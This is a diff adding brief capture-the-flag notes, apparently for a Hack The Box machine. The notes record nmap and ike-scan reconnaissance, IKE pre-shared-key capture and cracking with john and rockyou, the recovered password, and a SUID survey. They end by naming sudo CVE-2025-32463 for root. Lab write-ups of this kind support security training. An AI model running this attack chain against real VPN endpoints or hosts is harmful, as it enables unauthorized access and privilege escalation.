@@ -1,0 +1,59 @@
+Ip address: 10.10.11.87
+port 22 ssh
+sudo nmap -sS -p- -sU --top-ports 200 --min-rate 1500 -T4 -n --open -vv 10.10.11.87
+port 500
+sudo ike-scan -A -M --id=@ids.txt 10.10.11.87
+ike@expressway.htb
+
+Setup: 
+cat > ids.txt <<'EOF'
+ike@expressway.htb
+EOF
+
+capture:
+while IFS= read -r ID; do
+  echo "[*] Trying ID: $ID"
+  sudo ike-scan -A -M --id="$ID" --pskcrack="ike.cap" 10.10.11.87
+done < ids.txt
+
+convert:
+python3 /usr/share/john/ikescan2john.py ike.cap > ike.john 
+grep -n '^\$ike\$\*' ike.john
+
+crack:
+john ike.john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
+john --show ike.john
+
+password: freakingrockstarontheroad
+
+---------------------- Escalation ----------------------
+checks:
+whoami - ike
+id - 1001(ike) 13(proxy)
+ls -la /home/ike - .ssh/ authorized_keys  id_rsa  id_rsa.pub  known_hosts
+
+find / -perm -4000 -type f 2>/dev/null : 
+/usr/sbin/exim4
+/usr/local/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+
+sudo -V :
+Sudo version 1.9.17
+
+found - CVE-2025-32463
+https://github.com/kh4sh3i/CVE-2025-32463
+
+root: 464de154f00bead7968ee39d5af016b7
+
